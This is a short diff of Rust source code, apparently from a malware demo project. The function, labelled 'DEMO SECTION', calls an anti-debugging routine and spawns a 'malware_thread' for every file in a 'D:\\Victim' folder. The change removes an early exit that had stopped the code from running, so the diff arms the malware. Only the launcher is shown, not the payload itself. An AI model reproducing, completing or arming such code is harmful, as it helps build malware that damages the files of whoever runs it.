@@ -134,10 +134,7 @@ fn main() {
     // DEMO SECTION
     prevent_debugging();
     let mut hanldes = vec![];
-    println!("Glitched");
-    unsafe{
-        libc::exit(-1);
-    }
+    
     for entry in WalkDir::new("D:\\Victim").max_depth(1).into_iter().filter_map(|e| e.ok()){
         let handle = thread::spawn(move||malware_thread(&entry.clone().path().to_str().expect("failed convert path to str")));
         hanldes.push(handle);
